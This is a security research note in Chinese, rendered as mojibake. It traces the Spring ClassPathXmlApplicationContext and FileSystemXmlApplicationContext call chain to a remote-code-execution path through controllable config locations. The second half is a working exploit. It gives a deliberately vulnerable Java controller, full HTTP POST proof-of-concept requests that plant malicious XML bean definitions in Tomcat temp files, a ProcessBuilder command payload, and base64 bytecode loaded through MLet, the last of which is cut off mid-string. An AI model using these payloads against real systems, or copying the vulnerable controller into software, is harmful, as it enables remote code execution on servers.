# üìù ClassPathXmlApplicationContext ÈìæË∑ØÁ¨îËÆ∞

------

## 1Ô∏è‚É£ ËÉåÊôØÊ¶ÇËø∞ (ÂèØ‰ª•Ë∑≥ËøáÁõ¥Êé•Âà∞‰∏çÂá∫ÁΩëÂà©Áî®)

- **‰ΩúÁî®**ÔºöSpring Êèê‰æõÁöÑ `FileSystemXmlApplicationContext` „ÄÅ `ClassPathXmlApplicationContext` Áî®‰∫é‰ªéÊñá‰ª∂Á≥ªÁªüÊàñ URL Âä†ËΩΩ XML ÈÖçÁΩÆÊñá‰ª∂ÔºåÂπ∂Ê†πÊçÆÂÖ∂‰∏≠ `<bean>` ÂÆö‰πâÂàõÂª∫ Bean„ÄÇ
- **È£éÈô©ÁÇπ**ÔºöÂ¶ÇÊûúÊîªÂáªËÄÖÂèØ‰ª•ÊéßÂà∂ `configLocations`ÔºåSpring ‰ºöËß£ÊûêËøúÁ®ã XML Âπ∂ÂÆû‰æãÂåñ‰ªªÊÑèÁ±ªÂØπË±°ÔºåÂèØËÉΩËß¶Âèë RCE„ÄÇ

------

## 2Ô∏è‚É£ Á±ªÁªßÊâøÂÖ≥Á≥ª

```markdown
ClassPathXmlApplicationContext
   ‚Ü≥ AbstractXmlApplicationContext
       ‚Ü≥ AbstractRefreshableConfigApplicationContext
           ‚Ü≥ AbstractRefreshableApplicationContext
               ‚Ü≥ AbstractApplicationContext
                   ‚Ü≥ DefaultResourceLoader
```

- `FileSystemXmlApplicationContext`ÔºöÂÖ•Âè£Á±ªÔºå‰º†ÂÖ• `configLocations` Âπ∂Ë∞ÉÁî® `refresh()`„ÄÇ
- `AbstractXmlApplicationContext`ÔºöÂÆö‰πâ XML Âä†ËΩΩÊµÅÁ®ãÔºåË∞ÉÁî® `loadBeanDefinitions(XmlBeanDefinitionReader)`„ÄÇ
- `AbstractApplicationContext`ÔºöÂÆûÁé∞ `ResourcePatternResolver`ÔºåÁÆ°ÁêÜ `resourcePatternResolver`„ÄÇ
- `DefaultResourceLoader`ÔºöË¥üË¥£Ê†πÊçÆË∑ØÂæÑ/URLÂàõÂª∫ `Resource` ÂØπË±°„ÄÇ

> `FileSystemXmlApplicationContext` ÂÆû‰æãÊú¨Ë∫´ÁªßÊâø‰∫Ü `DefaultResourceLoader`ÔºåÊâÄ‰ª•ÂÆÉËÉΩË¢´ `XmlBeanDefinitionReader` ÂΩì‰Ωú `ResourceLoader` ‰ΩøÁî®„ÄÇ

------

## 3Ô∏è‚É£ Ê†∏ÂøÉË∞ÉÁî®Èìæ

### 3.1 ÊûÑÈÄ†ÂáΩÊï∞ÂÖ•Âè£

```java
public FileSystemXmlApplicationContext(String[] configLocations, boolean refresh, @Nullable ApplicationContext parent) {
    super(parent);
    this.setConfigLocations(configLocations); // ‰øùÂ≠òË∑ØÂæÑ/URL
    if (refresh) {
        this.refresh(); // Ëß¶ÂèëÊï¥‰∏™ÂÆπÂô®ÂàùÂßãÂåñ
    }
}
```

- `setConfigLocations`ÔºöÁà∂Á±ª `AbstractRefreshableConfigApplicationContext` ÊñπÊ≥ïÔºåÂ∞Ü `configLocations` ‰øùÂ≠òÂà∞ÊàêÂëòÂèòÈáè„ÄÇ
- `refresh()`ÔºöÁà∂Á±ª `AbstractApplicationContext` ÊñπÊ≥ïÔºåÂàùÂßãÂåñ BeanFactory Âπ∂Âä†ËΩΩ BeanDefinition„ÄÇ

------

### 3.2 refresh() Ë∞ÉÁî® loadBeanDefinitions

Âú® `AbstractApplicationContext.refresh()` ‰∏≠‰ºöÊâßË°åÔºö

1. ###### ÂàõÂª∫ BeanFactory

```java
ConfigurableListableBeanFactory beanFactory = this.obtainFreshBeanFactory();
	‚Üì
protected ConfigurableListableBeanFactory obtainFreshBeanFactory() {
    this.refreshBeanFactory();
    return this.getBeanFactory();
}
	‚Üì
protected abstract void refreshBeanFactory() throws BeansException, IllegalStateException;
	‚Üì
protected final void refreshBeanFactory() throws BeansException {
    if (this.hasBeanFactory()) {
        this.destroyBeans();
        this.closeBeanFactory();
    }

    try {
        DefaultListableBeanFactory beanFactory = this.createBeanFactory();
        beanFactory.setSerializationId(this.getId());
        this.customizeBeanFactory(beanFactory);
        this.loadBeanDefinitions(beanFactory);
        this.beanFactory = beanFactory;
    } catch (IOException ex) {
        throw new ApplicationContextException("I/O error parsing bean definition source for " + this.getDisplayName(), ex);
    }
}

```

1. ###### Ë∞ÉÁî®Ôºö

```java
this.loadBeanDefinitions(beanFactory);
```

- ÂØπÂ∫î `AbstractXmlApplicationContext.loadBeanDefinitions(XmlBeanDefinitionReader)`Ôºö

```java
protected void loadBeanDefinitions(XmlBeanDefinitionReader reader) throws BeansException, IOException {
    Resource[] configResources = this.getConfigResources();
    if (configResources != null) {
        reader.loadBeanDefinitions(configResources); // Resource[] Ë∞ÉÁî®Â≠êÁ±ªÂÆûÁé∞
    }

    String[] configLocations = this.getConfigLocations();
    if (configLocations != null) {
        reader.loadBeanDefinitions(configLocations); // String[] Ë∞ÉÁî®Áà∂Á±ª AbstractBeanDefinitionReader
    }
}
```

------

### 3.3 AbstractBeanDefinitionReader Â§ÑÁêÜÂ≠óÁ¨¶‰∏≤Ë∑ØÂæÑ

```java
public int loadBeanDefinitions(String location, @Nullable Set<Resource> actualResources) throws BeanDefinitionStoreException {
    ResourceLoader resourceLoader = this.getResourceLoader();  // ‚Üê this ÊòØ FileSystemXmlApplicationContext
    if (resourceLoader == null) throw new BeanDefinitionStoreException(...);

    if (resourceLoader instanceof ResourcePatternResolver) {
        Resource[] resources = ((ResourcePatternResolver)resourceLoader).getResources(location); // ‚Üê Ëß¶Âèë Resource Ëß£Êûê
        ...
    }
}
```

- **Ëß¶ÂèëÁÇπ**Ôºö`resourceLoader.getResources(location)`
- `resourceLoader` ÊòØÈÄöËøá `XmlBeanDefinitionReader.setResourceLoader(this)` ËÆæÁΩÆÁöÑ
  - `this` = `FileSystemXmlApplicationContext`
  - ÂÆÉÁªßÊâø‰∫Ü `AbstractApplicationContext` ‚Üí ÂÆûÁé∞‰∫Ü `ResourcePatternResolver`

------

### 3.4 AbstractApplicationContext.getResources

```java
public Resource[] getResources(String locationPattern) throws IOException {
    return this.resourcePatternResolver.getResources(locationPattern);
}
```

- `resourcePatternResolver` ÈªòËÆ§ÊòØÔºö

```java
this.resourcePatternResolver = new PathMatchingResourcePatternResolver(this);
```

- **‰ΩúÁî®**ÔºöÂ§ÑÁêÜÈÄöÈÖçÁ¨¶ÔºàÂ¶Ç `classpath*:*.xml`Ôºâ
- ÂØπ‰∫éÂçï‰∏ÄËµÑÊ∫êÔºàHTTP URL ÊàñÊñá‰ª∂Ë∑ØÂæÑÔºâÔºå‰ºöË∞ÉÁî®Ôºö

```java
getResourceLoader().getResource(location)
```

- ËøôÈáåÁöÑ `getResourceLoader()` ‚Üí `this`ÔºàFileSystemXmlApplicationContext ‚Üí DefaultResourceLoaderÔºâ

------

### 3.5 PathMatchingResourcePatternResolver ‚Üí DefaultResourceLoader

ÊúÄÁªàËß£ÊûêÈÄªËæëÂú® `DefaultResourceLoader`Ôºö

```java
public Resource getResource(String location) {
    if (location.startsWith("/")) {
        return getResourceByPath(location);
    } else if (location.startsWith("classpath:")) {
        return new ClassPathResource(...);
    } else {
        try {
            URL url = new URL(location);
            return new UrlResource(url);  // ‚Üê ËøúÁ®ã URL
        } catch (MalformedURLException ex) {
            return getResourceByPath(location);
        }
    }
}
```

- `http://` ‚Üí ÂàõÂª∫ `UrlResource` ‚Üí ÊâìÂºÄ URL ÊµÅ
- `classpath:` ‚Üí ÂàõÂª∫ `ClassPathResource` ‚Üí ËØªÂèñ classpath
- Êñá‰ª∂Ë∑ØÂæÑ ‚Üí `FileSystemResource` ‚Üí ËØªÂèñÊú¨Âú∞Êñá‰ª∂

------

### 3.6 XmlBeanDefinitionReader Ëß£Êûê XML

- `XmlBeanDefinitionReader.loadBeanDefinitions(Resource...)`
- Ëß£Êûê `<bean>` ÂÖÉÁ¥† ‚Üí Ë∞ÉÁî®ÊûÑÈÄ†ÂáΩÊï∞/Â∑•ÂéÇÊñπÊ≥ï ‚Üí Ê≥®ÂÜåÂà∞ BeanFactory
- ÊîªÂáªËÄÖÂèØ‰ª•Âú® XML ÈáåÂÆö‰πâ **‰ªªÊÑèÁ±ª + Â±ûÊÄßÊ≥®ÂÖ•**ÔºåËß¶Âèë RCE

------

## 4Ô∏è‚É£ ÂÖ®ÈìæË∑ØÊÄªÁªì

```pgsql
FileSystemXmlApplicationContext(configLocations)
    ‚Üì
refresh()
    ‚Üì
AbstractApplicationContext.obtainFreshBeanFactory()
	‚Üì
AbstractApplicationContext.refreshBeanFactory()
	‚Üì
AbstractRefreshableApplicationContext.refreshBeanFactory()
	‚Üì
AbstractRefreshableApplicationContext.loadBeanDefinitions(DefaultListableBeanFactory beanFactory)
	‚Üì
AbstractXmlApplicationContext.loadBeanDefinitions(DefaultListableBeanFactory beanFactory)
    ‚Üì
AbstractXmlApplicationContext.loadBeanDefinitions(XmlBeanDefinitionReader reader)
	‚Üì
AbstractBeanDefinitionReader.loadBeanDefinitions(XmlBeanDefinitionReader reader)
	‚Üì
AbstractApplicationContext.getResources()
	‚Üì
PathMatchingResourcePatternResolver.getResources(String locationPattern)
	‚Üì
DefaultResourceLoader.getResource(String location) // FileSystemXmlApplicationContext ÂÆû‰æã
    ‚Üì
AbstractApplicationContext.getResources(locationPattern)
    ‚Üì
PathMatchingResourcePatternResolver.getResources(locationPattern)
    ‚Üì
DefaultResourceLoader.getResource(location)   ‚Üê ÊúÄÁªàËß£Êûê URL/Ë∑ØÂæÑ
    ‚Üì
XmlBeanDefinitionReader.doLoadBeanDefinitions(InputSource)  // Ëß£Êûê XML
    ‚Üì
Bean ÂÆû‰æãÂåñ ‚Üí Â±ûÊÄßÊ≥®ÂÖ• ‚Üí RCE
```

------

## 5Ô∏è‚É£ ÊÄªÁªì

1. **ÁªßÊâø‰∏éÊñπÊ≥ïË∞ÉÁî®**
   - `this.setConfigLocations()` ‚Üí Áà∂Á±ªÊñπÊ≥ï
   - `this.refresh()` ‚Üí È´òÂ±ÇÁà∂Á±ªÊñπÊ≥ï
   - **Â§öÊÄÅÂä®ÊÄÅÁªëÂÆö**ÔºöÊñπÊ≥ïË∞ÉÁî®ÁöÑËøêË°åÊó∂ÂØπË±°ÊòØ `FileSystemXmlApplicationContext`
2. **ResourceLoader ÂéüÁêÜ**
   - `FileSystemXmlApplicationContext` ÁªßÊâø `DefaultResourceLoader`
   - `PathMatchingResourcePatternResolver` ÊîØÊåÅÈÄöÈÖçÁ¨¶ÔºåÂπ∂ÂßîÊâò `getResource()`
   - **ÊúÄÁªàËß£Êûê URL** ÁöÑÂú∞ÊñπÂú® `DefaultResourceLoader.getResource()`
3. **XML Ëß£ÊûêÊú∫Âà∂**
   - `XmlBeanDefinitionReader` ÂÆûÁé∞‰∫Ü `loadBeanDefinitions(Resource...)`
   - Â∞Ü XML Ëß£Êûê‰∏∫ BeanDefinition ‚Üí ÂÆû‰æãÂåñ Bean ‚Üí ÂèØËÉΩÊâßË°åÊûÑÈÄ†ÊñπÊ≥ïÊàñÈùôÊÄÅÊñπÊ≥ï
4. **Âà©Áî®ÁÇπ**
   - ÂèØÊéß `configLocations` ‚Üí ËøúÁ®ã XML URL ‚Üí ‰ªªÊÑè Bean ÂÆû‰æãÂåñ ‚Üí RCE



## 6Ô∏è‚É£ ÈöèÂêéÁ¨îËÆ∞

```java
public void refresh() throws BeansException {
    // 1. ÂàõÂª∫ BeanFactory Âπ∂Âä†ËΩΩ BeanDefinitionÔºàÂè™ÊòØËß£Êûê XMLÔºåÊîæÂà∞ÂÜÖÂ≠ò‰∏≠Ôºâ
    ConfigurableListableBeanFactory beanFactory = obtainFreshBeanFactory();

    // 2. ÂáÜÂ§á BeanFactoryÔºàËÆæÁΩÆÁ±ªÂä†ËΩΩÂô®„ÄÅPostProcessor Á≠âÔºâ
    prepareBeanFactory(beanFactory);

    // 3. Ë∞ÉÁî® BeanFactoryPostProcessor ÔºàÂØπ BeanDefinition ÂÅö‰øÆÊîπÔºâ
    invokeBeanFactoryPostProcessors(beanFactory);

    // 4. Ê≥®ÂÜå BeanPostProcessorÔºàÂÆû‰æãÂåñÂâçÂêéÂõûË∞ÉÔºâ
    registerBeanPostProcessors(beanFactory);

    // 5. ÂàùÂßãÂåñ MessageSource Á≠âÂõΩÈôÖÂåñÁªÑ‰ª∂
    initMessageSource();

    // 6. ÂàùÂßãÂåñ‰∫ã‰ª∂ÂπøÊí≠Âô®
    initApplicationEventMulticaster();

    // 7. Ê≥®ÂÜåÁõëÂê¨Âô®
    registerListeners();

    // 8. **ÂÆû‰æãÂåñÂâ©‰ΩôÁöÑÔºàÈùûÊáíÂä†ËΩΩÁöÑÔºâÂçï‰æã Bean**
    finishBeanFactoryInitialization(beanFactory);

    // 9. ÂÆåÊàêÂà∑Êñ∞ÔºåÂèëÂ∏É‰∫ã‰ª∂
    finishRefresh();
}
```





------

# ‚ú® ClassPathXmlApplicationContext ‰∏çÂá∫ÁΩëÂà©Áî®

> ÂéüÊñáÁ´†ÈìæÊé•Ôºöhttps://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-network.html
>
> Êª°Ë∂≥‰∏§‰∏™ÁÇπÔºö
>
> - ÂÖ∂‰∏ÄÔºåtomcatÁöÑËßÑÂàôÔºåÂΩìËØ∑Ê±ÇÁ±ªÂûãÊòØpostËØ∑Ê±ÇÔºåËÄå‰∏îcontent-typeÁ±ªÂûã‰∏∫multipart/form-dataÊó∂Ôºåtomcat‰ºöÂ∞ÜËØ∑Ê±Ç‰Ωì‰øùÂ≠òÂú®‰∏¥Êó∂ÁõÆÂΩïÁöÑ‰∏¥Êó∂Êñá‰ª∂‰∏≠„ÄÇ
> - ÂÖ∂‰∫åÔºåÂ∞±ÊòØClassPathXmlApplicationContextÂú®Ëß¶ÂèëÈìæË∑ØÁöÑËøáÁ®ã‰∏≠‰ºö‰ºöËøõË°å${}Ëß£Êûê‰∏îÊîØÊåÅÈÄöÈÖçÁ¨¶ÁöÑÊìç‰ΩúÔºåËøô‰πüÂ∞±‰∏éÁ¨¨‰∏ÄÊù°Êê≠ÈÖç‰∫ßÁîü‰∫ÜÂÖ≥Á≥ªÔºåÂõ†‰∏∫‰∏¥Êó∂Êñá‰ª∂ÁöÑÊñá‰ª∂ÂêçÊòØÈöèÊú∫ÂÆö‰πâÁöÑ„ÄÇ‰∏äÈù¢ÁöÑURI‰∏≠ÁöÑargÂèÇÊï∞ÂÄºÂ∞±‰ΩøÁî®Âà∞‰∫ÜÈÄöÈÖçÁ¨¶*„ÄÇ



------

## 1Ô∏è‚É£ Âà©Áî®ÈìæË∑ØËß£Êûê

> Áõ¥Êé•‰∏äÂà©Áî®ÊºèÊ¥ûÊ∫êÁ†ÅÂíåPOCÔºå‰∏∫‰ºòÂåñÂêéÁöÑPOC

```java
@Controller
public class IndexController {
    
    @ResponseBody
    @RequestMapping("/index")
    public String index(String name, String org) throws Exception {

        Class<?> clazz = Class.forName(name);
        Constructor<?> constructor = clazz.getConstructor(String.class);
        Object instance = constructor.newInstance(org);
        
        // ËøôÈáåËæìÂá∫ÊòæÁ§∫tomcat‰∏¥Êó∂Êñá‰ª∂‰ΩçÁΩÆ
        String property = System.getProperty("catalina.home");
        return property;
    }
}
```

```http
POST /index?name=org.springframework.context.support.ClassPathXmlApplicationContext&org=file:/%24%7bcatalina.home%7d/**/*.tmp HTTP/1.1
Host: 127.0.0.1:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=4ad051cf61a54e2a9831a1e30
Content-Length: 800

--4ad051cf61a54e2a9831a1e30
Content-Disposition: form-data; name="field1"

<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="commandRunner" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>cmd.exe</value>
                <value>/c</value>
                <value><![CDATA[calc.exe]]></value>
            </list>
        </constructor-arg>
    </bean>
</beans>
--4ad051cf61a54e2a9831a1e30--
```

------

### 1.1 Tomcat‰∏¥Êó∂Êñá‰ª∂ÂàõÂª∫ÂíåÈîÄÊØÅ

> ‚Äã	(Ë¥¥Â∏ñÂ≠êÂéüÊñá) ÂΩìÂÖ∂Êé•Êî∂Âà∞multipart/form-dataÁöÑËØ∑Ê±ÇÊó∂Ôºå‰ºöÂ∞ÜÊØè‰∏™multipartÂùó‰æùÊ¨°‰øùÂ≠òÂú®‰∏¥Êó∂ÁõÆÂΩï‰∏ãÔºåÊñá‰ª∂Âêç‰∏∫`upload_<GUID>_<number>.tmp`„ÄÇ‰ΩøÁî®ProcessMonitorÁõëÊµã„ÄÇ

![image-20251125152541725](./assets/image-20251125152541725.png)



------

### 2.2 ClassPathXmlApplicationContext UrlËß£Êûê

‚Äã		Êàë‰ª¨ÊâÄÁªôÂá∫ÁöÑ  `file:/%24%7bcatalina.home%7d/**/*.tmp`  ÁöÑorgÔºå‰ºöÂú® `ClassPathXmlApplicationContext` Á±ª‰∏≠Ëµ∞Âêë‰∏§‰∏™ÈáçË¶ÅÁöÑÂáΩÊï∞Ôºå‰πüÂ∞±ÊòØÂ¶Ç‰∏ãÁöÑ `setConfigLocations` „ÄÅ`refresh`  ÔºåÂÖ∂‰∏ÄÊòØ‰ºöËøõË°å  `${}`  ÁöÑËß£ÊûêÔºåÂÖ∂‰∫å‰ºöËøõË°åÂåπÈÖçÈÄöÈÖçÁ¨¶ÁöÑÊìç‰ΩúËÄå‰∏îËøò‰ºöËß£ÊûêÊòØ‰∏∫fileÊú¨Âú∞ËøòÊòØurlËøúÁ®ã„ÄÇ

```java
public FileSystemXmlApplicationContext(String[] configLocations, boolean refresh, @Nullable ApplicationContext parent) throws BeansException {
    super(parent);
    this.setConfigLocations(configLocations);
    if (refresh) {
        this.refresh();
    }

}
```

#### 2.2.1 setConfigLocations()

> ÈìæË∑ØÔºö

```pgsql
AbstractRefreshableConfigApplicationContext.setConfigLocations(@Nullable String... locations)
      ‚Üì
AbstractRefreshableConfigApplicationContext.resolvePath(String path)
      ‚Üì
AbstractEnvironment.resolveRequiredPlaceholders(String text)
      ‚Üì
AbstractPropertyResolver.resolveRequiredPlaceholders(String text)
      ‚Üì
AbstractPropertyResolver.doResolvePlaceholders(String text, PropertyPlaceholderHelper helper)
      ‚Üì
PropertyPlaceholderHelper.replacePlaceholders(String value, PlaceholderResolver placeholderResolver)
      ‚Üì
PropertyPlaceholderHelper.parseStringValue(String value, PlaceholderResolver placeholderResolver, @Nullable Set<String> visitedPlaceholders)  
```

![image-20251125170829643](./assets/image-20251125170829643.png)

EnvironmentÂèØ‰ª•Áî®Êù•Ëß£Êûê${}

```java
ConfigurableEnvironment env = new StandardEnvironment();
String os = env.resolveRequiredPlaceholders("${os.name}");
System.out.println(os);
```

#### 2.2.2 refresh()

‚Äã	‰∏äÈù¢  `FileSystemXmlApplicationContext`  ÈìæË∑ØÁ¨îËÆ∞ 3.6 ÈìæË∑ØÁöÑ `PathMatchingResourcePatternResolver` ÁöÑ `getResources` ÊñπÊ≥ï‰∏≠ `AntPathMatcher` ÁöÑ `isPattern` ‰∏∫ `AntPathMatcher` ÁöÑÊñπÊ≥ï‰ΩìÁé∞Âà∞‰∫ÜÈÄöÈÖçÁ¨¶

```java
    public boolean isPattern(@Nullable String path) {
        if (path == null) {
            return false;
        } else {
            boolean uriVar = false;

            for(int i = 0; i < path.length(); ++i) {
                char c = path.charAt(i);
                if (c == '*' || c == '?') {
                    return true;
                }

                if (c == '{') {
                    uriVar = true;
                } else if (c == '}' && uriVar) {
                    return true;
                }
            }

            return false;
        }
    }
```

‚Äã	ÁÑ∂ÂêéÂÜçÂæÄ‰∏ãËµ∞ `DefaultResourceLoader.getResource(location) ` ÂÖ∂‰∏≠ `Resource` Ëé∑ÂèñËµÑÊ∫êÔºå‰∏âÂÖÉÂà§Êñ≠ÊòØ‰ªé `FileUrlResource` 

 „ÄÅ `UrlResource` ‰∏≠Ëé∑Âèñ„ÄÇ

```java
public Resource getResource(String location) {
    Assert.notNull(location, "Location must not be null");

    for(ProtocolResolver protocolResolver : this.getProtocolResolvers()) {
        Resource resource = protocolResolver.resolve(location, this);
        if (resource != null) {
            return resource;
        }
    }

    if (location.startsWith("/")) {
        return this.getResourceByPath(location);
    } else if (location.startsWith("classpath:")) {
        return new ClassPathResource(location.substring("classpath:".length()), this.getClassLoader());
    } else {
        try {
            URL url = new URL(location);
            return (Resource)(ResourceUtils.isFileURL(url) ? new FileUrlResource(url) : new UrlResource(url));
        } catch (MalformedURLException var5) {
            return this.getResourceByPath(location);
        }
    }
}
```



------

## 2Ô∏è‚É£ Java Chains

> Âú®ÊñáÁ´†‰∏≠‰ΩøÁî®ÁöÑÊòØ JegGadget(Ë∞ÉÁî® Jeg ÁîüÊàêÂõûÊòæÂ≠óËäÇÁ†Å) ÁîüÊàêÁöÑPayloadÔºå ËøôÈáåÈ¶ñÂÖàËøõË°åÁÆÄÂçïÁöÑExecÊâßË°åÂëΩ‰ª§ÁöÑPayload

#### 2.1 Exec(ÊâßË°åÂëΩ‰ª§)

![image-20251126142817675](./assets/image-20251126142817675.png)

> ‚Äã	ËøôÈáåÈÄöËøá `DatatypeConverter.parseBase64Binary` ÈùôÊÄÅÊñπÊ≥ïÂØπÂ≠óËäÇÁ†ÅÊñá‰ª∂ËøõË°åËß£Á†ÅÔºåÁÑ∂ÂêéÂÜçÁî±MLet.defineClassÂÆö‰πâÂä†ËΩΩ„ÄÇ

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
                           http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="decoder" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
        <property name="staticMethod" value="javax.xml.bind.DatatypeConverter.parseBase64Binary"/>
        <property name="arguments">
            <list>
                <value>yv66vgAAADIAQAEAYm9yZy9hcGFjaGUvY29sbGVjdGlvbnMvY295b3RlL2Rlc2VyaWFsaXphdGlvbi9CZWFuRGVzZXJpYWxpemVyQmFzZWY3ZjM4NDY5ZmViNzQzNGU5Mzk1ZTcyODFkNzNjOGYwBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEABGJhc2UBABJMamF2YS9sYW5nL1N0cmluZzsBAANzZXABAANjbWQBAAY8aW5pdD4BAAMoKVYBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwALDAAJAAoKAAQADQEAB29zLm5hbWUIAA8BABBqYXZhL2xhbmcvU3lzdGVtBwARAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwwAEwAUCgASABUBABBqYXZhL2xhbmcvU3RyaW5nBwAXAQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwAGQAaCgAYABsBAAN3aW4IAB0BAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAHwAgCgAYACEBAAdjbWQuZXhlCAAjDAAFAAYJAAIAJQEAAi9jCAAnDAAHAAYJAAIAKQEABy9iaW4vc2gIACsBAAItYwgALQwACAAGCQACAC8BABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHADEBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAJADMKADIANAEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DAA2ADcKADIAOAEACDxjbGluaXQ+AQAEY2FsYwgAOwoAAgANAQAEQ29kZQEADVN0YWNrTWFwVGFibGUAIQACAAQAAAADAAkABQAGAAAACQAHAAYAAAAJAAgABgAAAAIAAQAJAAoAAQA+AAAAhAAEAAIAAABTKrcADhIQuAAWtgAcEh62ACKZABASJLMAJhIoswAqpwANEiyzACYSLrMAKga9ABhZA7IAJlNZBLIAKlNZBbIAMFNMuwAyWSu3ADW2ADlXpwAETLEAAQAEAE4AUQAMAAEAPwAAABcABP8AIQABBwACAAAJZQcADPwAAAcABAAIADoACgABAD4AAAAaAAIAAAAAAA4SPLMAMLsAAlm3AD1XsQAAAAAAAA==</value>

            </list>

        </property>

    </bean>

    <bean id="classLoader" class="javax.management.loading.MLet"/>
    <bean id="clazz" factory-bean="classLoader" factory-method="defineClass">
        <constructor-arg ref="decoder"/>
        <constructor-arg type="int" value="0"/>
        <constructor-arg type="int" value="907"/>
    </bean>

    <bean factory-bean="clazz" factory-method="newInstance"/>
</beans>
```

> ‚Äã		ÂØπËøô‰∏≤base64ËøòÂéüÁúãÂà∞‰πüÂ∞±Âè™ÊòØÊ£ÄÊµãÁ≥ªÁªüÂÆö‰πâËøêË°åÂëΩ‰ª§ÔºåProcessBuilderÊâßË°å„ÄÇ
>

![image-20251126143415770](./assets/image-20251126143415770.png)

------

#### 2.2  JegGadget(Ë∞ÉÁî® Jeg ÁîüÊàêÂõûÊòæÂ≠óËäÇÁ†Å)

![image-20251202093119407](./assets/image-20251202093119407.png)

##### 2.2.1 POC

```http
POST /index?name=org.springframework.context.support.ClassPathXmlApplicationContext&org=file:/%24%7bcatalina.home%7d/**/*.tmp HTTP/1.1
Host: 127.0.0.1:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=4ad051cf61a54e2a9831a1e30b9dcc31
Content-Length: 7983
X-Authorization: dir/a

--4ad051cf61a54e2a9831a1e30b9dcc31
Content-Disposition: form-data; name="field1"

<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
                           http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="decoder" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
        <property name="staticMethod" value="javax.xml.bind.DatatypeConverter.parseBase64Binary"/>
        <property name="arguments">
            <list>
                <value>yv66vgAAADIBOwEAUG9yZy9hcGFjaGUvc2hpcm8vY295b3RlL3Nlci9zdGQvU3RyaW5nU2VyaWFsaXplcjc5YzFjYzEwODNhNjQxNWU4YjMxODdhYzMzMTc5MTY5BwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEABjxpbml0PgEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HAAcMAAUABgoABAAJAQADcnVuDAALAAYKAAIADAEAEGdldFJlcUhlYWRlck5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAD1gtQXV0aG9yaXphdGlvbggAEAEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcAEgEAE2phdmEvbGFuZy9UaHJvd2FibGUHABQBABBqYXZhL2xhbmcvVGhyZWFkBwAWAQAKZ2V0VGhyZWFkcwgAGAEAD2phdmEvbGFuZy9DbGFzcwcAGgEAEltMamF2YS9sYW5nL0NsYXNzOwcAHAEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwAHgAfCgAbACABABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACIBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAJAAlCgAjACYBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACgAKQoAIwAqAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcALAEAB2dldE5hbWUMAC4ADwoAFwAvAQAEaHR0cAgAMQEAEGphdmEvbGFuZy9TdHJpbmcHADMBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwANQA2CgA0ADcBAAhBY2NlcHRvcggAOQEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAOwA8CgAEAD0BAAZ0YXJnZXQIAD8BABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABBAEIKABsAQwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkBwBFCgBGACYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwASABJCgBGAEoBAAhlbmRwb2ludAgATAEABnRoaXMkMAgATgEAB2hhbmRsZXIIAFABAA1nZXRTdXBlcmNsYXNzDABSADwKABsAUwEABmdsb2JhbAgAVQEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAVwBYCgAbAFkBACJvcmcuYXBhY2hlLmNveW90ZS5SZXF1ZXN0R3JvdXBJbmZvCABbAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwBdAQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0N